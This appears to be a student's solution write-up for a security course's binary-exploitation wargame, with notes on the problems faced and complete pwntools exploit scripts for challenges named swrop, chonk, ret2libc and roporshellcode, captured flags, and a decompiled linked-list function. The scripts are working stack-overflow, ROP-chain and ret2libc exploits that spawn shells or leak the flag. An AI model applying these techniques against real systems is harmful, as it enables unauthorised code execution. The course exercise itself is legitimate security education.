swrop
=============================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNS1zd3JvcCIsImlwIjoiMTQ0LjEzNi4yOC4zNiIsInNlc3Npb24iOiJhOTM4MTA4Zi00NGI3LTQwZjYtYTA0Yi02NmJkODZmMmZlMjUifQ.iiSXvRFv5zQKXVjHqwK68sVKgd3w0vXujWdzVp0g71E}
General overview of problems faced
-----------------------------------------------------------------
Need to find the offset to overflow to the return address
Need to properly place arguments (return address, then arguments)
Script/Command used
------------------------------------------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './swrop' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 26332 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

system_target = e.symbols["system"]
binsh_target = next(e.search(b"/bin/sh\00"))
offset = cyclic_find(0x6261616a)
payload = fit({
    offset: system_target,
    offset + 4: p32(0),
    offset + 8: p32(binsh_target)
})
p.sendline(payload)

p.interactive()
```

chonk
===============================================================
Flag:
General overview of problems faced
---------------------------------------------------------------
The binary is MASSIVE ... at least compared to our usual wargames
Script/Command used
Some simple gadgets such as pop edx; ret; are not available.
Triggering segmentation faults in random functions such as do_derivation and mem2chunk_check.
Need to avoid badbytes such as 0a from the pop eax; ret; so have to use alternative gadgets.
--------------------------------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './chonk' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 29224 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
offset = cyclic_find(0x61616164)
inc_eax = 0x08061433
# ALt: 0x08065480
int_0x80 = 0x0804a422
pop_eax = 0x080518e5
pop_edx_ebx_esi = 0x0805f5b6
edx_eax = 0x08058eb2
eax_edx = 0x08090dd8
xor_eax = 0x0804fa20
pop_ecx_alf6 =  0x0805d761
writable_region = 0x8049d5a
junk = p32(0)

chain = (
    p32(pop_eax)
    + b'//bi'
    + p32(pop_edx_ebx_esi)
    + p32(writable_region)
    + junk
    + junk
    + p32(edx_eax)
    + p32(pop_eax)
    + b'n/sh'
    + p32(pop_edx_ebx_esi)
    + p32(writable_region+4)
    + junk
    + junk
    + p32(edx_eax)
    + p32(xor_eax)
    + p32(pop_edx_ebx_esi)
    + p32(writable_region+8)
    + junk
    + junk
    + p32(edx_eax)
    + p32(pop_eax)
    + p32(writable_region)
    + p32(pop_edx_ebx_esi)
    + p32(writable_region+12)
    + junk
    + junk
    + p32(edx_eax)
    + p32(xor_eax)
    + p32(pop_edx_ebx_esi)
    + p32(writable_region+16)
    + junk
    + junk
    + p32(edx_eax)
    + p32(pop_edx_ebx_esi)
    + p32(writable_region+8)
    + p32(writable_region)
    + junk
    + p32(pop_ecx_alf6)
    + p32(writable_region+12)
    + p32(xor_eax)
    + p32(inc_eax)*11
    + p32(int_0x80)
)
p.recvline()
payload = fit({
    offset: chain
})
p.sendline(payload)
p.interactive()
```

ret2libc
================================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNS1yZXQybGliYyIsImlwIjoiMTQ0LjEzNi4yOC4zNiIsInNlc3Npb24iOiJhOTBkNTdmZC00MWJiLTRlMjEtOTg2Yy05MTEyNDU3NTE5MDQifQ.xPjh3kxeJ5BmINEjy9-wKq81-UOirLrZ2R8Uj2SK_0E}
General overview of problems faced
----------------------------------------------------------------
Have to find base address of libc
Libc versions are different on local and remote.
Have to run script multiple times to get a lucky ASLR seed.
Need to figure out how many bytes to write
Script/Command used
----------------------------------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './ret2libc' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 29471 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
    libc = ELF('./libc-2.23.so')
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
p.recvuntil(b'- ',drop=True)
setbuf_leak = p.recvline()
setbuf_leak = setbuf_leak[:-3]
setbuf_leak = int(setbuf_leak, 16)
log.info(f"setbuf is at: {hex(setbuf_leak)}")
p.recvline()

setbuf_offset = libc.symbols["setbuf"] #0x52900
libc.address = setbuf_leak - setbuf_offset
log.info(f"base libc address: {hex(libc.address)}")
libc_system = libc.symbols["system"]
libc_binsh = next(libc.search(b'/bin/sh\00'))
assert(libc_binsh is not None)
return_addr_junk = p32(0)

# buffer at ebp-4ce

payload = (p32(libc_system) + return_addr_junk + p32(libc_binsh)) *0x65
payload += b'\x00'*14

p.sendline(payload)
p.interactive()

```

roporshellcode
================================================================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNS1yb3BvcnNoZWxsY29kZSIsImlwIjoiMTQ0LjEzNi4yOC4zNiIsInNlc3Npb24iOiJlYjM1M2M2Yi1mNDUyLTQyMjUtOWI3Mi1jZmViN2EzNTkyNTYifQ.h7Y5_7IcWzXM1iQm-knLqLoIHEE-trBoxKchNOvgDDQ}
General overview of problems faced
----------------------------------------------------------------
Very few useful gadgets, especially to manipulate ecx.
Need to somehow store the writable region address into ecx.
Can use mov ecx, esp but we'd probably need a way to store the original values to uncorrupt the register (mov ebp, esp)
Script/Command used
-----------------------------------------------------------------
```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './roporshellcode' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 28180 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
    libc = ELF('./libc-2.23.so')
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
    libc = ELF('/lib/i386-linux-gnu/libc-2.27.so')
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
offset = cyclic_find(0x61616164)
pop_ebx = p32(0x08049022)
mov_eax_0_leave = p32(0x08049275)
eax_ecx = p32(0x080491c4)
ebx_edx = p32(0x080491cd)
eax_edx__ebx_edx = p32(0x080491cb)
inc_edx = p32(0x080491d0)
ebp_esp = p32(0x080491b7)
ecx_esp = p32(0x080491ff)
sub_ecx_4 = p32(0x080491c0)
xor_edx = p32(0x080491ba)
int_0x80 = p32(0x080491bd)

writable_region = p32(0x80491a9) #p32(0x8048388)  

p.recvuntil(b'fd: ', drop=True)
fd = p.recvline()
log.info(f"flag at fd: {int(fd)}")
p.recvline()

chain = (
    xor_edx
    + inc_edx*3
    + eax_edx__ebx_edx
    + ebp_esp
    + ecx_esp
    + inc_edx*97
    + int_0x80

    + xor_edx
    + inc_edx*4
    + eax_edx__ebx_edx
    + pop_ebx
    + p32(1)
    + inc_edx*96
    + int_0x80

    + xor_edx
    + inc_edx
    + int_0x80
)

payload = fit ({
    offset-4: writable_region,
    offset: chain
})

p.sendline(payload)
p.interactive()
```

re challenge
=======================================================================
General overview of problems faced
-------------------------------------------------------------------------
Need to find out the data structure used.
Need to find out what byte does.
Need to flesh out the condition control structure of the code.
Need to figure out the while loop condition
```C
struct s {
    int data;
    struct s *next;
}
void *new() {
    struct s *next = NULL;
    int counter = 0;
    while (true) {
        if (counter <= 9) {
            struct s *data_struct = malloc(8);
            if (data_struct != NULL) {
                if (next != NULL) {
                    data_struct->next = next;
                    next = data_struct;
                } else {
                    next = data_struct;
                }
                data_struct->next = NULL;
                data_struct->data = counter + 65;
                counter++;
            } else {
                exit(1);
            }
        } else {
            return next;
        }
    }
}
```